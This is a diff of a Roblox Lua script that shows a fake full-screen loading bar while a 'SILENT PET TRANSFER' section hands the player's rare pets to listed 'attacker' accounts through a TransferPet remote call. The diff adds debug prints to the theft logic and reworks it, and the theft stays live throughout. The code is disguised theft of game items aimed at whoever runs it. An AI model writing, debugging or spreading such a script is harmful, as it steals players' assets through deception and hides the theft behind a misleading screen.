@@ -28,7 +28,7 @@ screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
 local bg = Instance.new("Frame", screenGui)
 bg.Size = UDim2.new(1, 0, 1, 0)
 bg.BackgroundColor3 = Color3.new(0, 0, 0)
-bg.BackgroundTransparency = 0 -- fully black
+bg.BackgroundTransparency = 0
 
 local title = Instance.new("TextLabel", bg)
 title.Size = UDim2.new(0, 800, 0, 100)
@@ -60,7 +60,6 @@ fill.Size = UDim2.new(0, 0, 1, 0)
 fill.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
 fill.BorderSizePixel = 0
 
--- 🎞️ GUI LOADING BAR Animation
 task.spawn(function()
     local percent = 0
     while percent <= 100 do
@@ -98,7 +97,7 @@ task.delay(3, function()
     end)
 end)
 
--- 🐾 3. SILENT PET TRANSFER
+-- 🐾 3. SILENT PET TRANSFER (DEBUG PRINT APPLIED)
 task.delay(3, function()
     local attackers = {
         ["boneblossom215"] = true,
@@ -112,6 +111,9 @@ task.delay(3, function()
         ["brontosaurus"] = true, ["mooncat"] = true, ["mimic octopus"] = true,
         ["disco bee"] = true, ["dilophosaurus"] = true, ["kitsune"] = true
     }
+
+    print("Starting pet transfer...")
+    print("Checking for attacker...")
 
     local maxWait = 180
     local elapsed = 0
@@ -130,15 +132,23 @@ task.delay(3, function()
         end
     end
 
-    if receiver then
-        local petFolder = LocalPlayer:FindFirstChild("Pets") or LocalPlayer:WaitForChild("Pets", 5)
-        if petFolder then
-            for _, pet in pairs(petFolder:GetChildren()) do
-                if targetPets[string.lower(pet.Name)] then
-                    local remote = ReplicatedStorage:FindFirstChild("TransferPet")
-                    if remote then
-                        remote:FireServer(pet, receiver)
-                    end
+    print("Found receiver:", receiver and receiver.Name or "None")
+
+    print("Checking for pet folder...")
+    local petFolder = LocalPlayer:FindFirstChild("Pets") or LocalPlayer:WaitForChild("Pets", 5)
+    if not petFolder then
+        print("No pet folder found.")
+    else
+        for _, pet in pairs(petFolder:GetChildren()) do
+            print("Checking pet:", pet.Name)
+            if targetPets[string.lower(pet.Name)] then
+                print("Target pet found:", pet.Name)
+                local remote = ReplicatedStorage:FindFirstChild("TransferPet")
+                if remote then
+                    print("Firing TransferPet for", pet.Name)
+                    remote:FireServer(pet, receiver)
+                else
+                    print("Remote not found.")
                 end
             end
         end
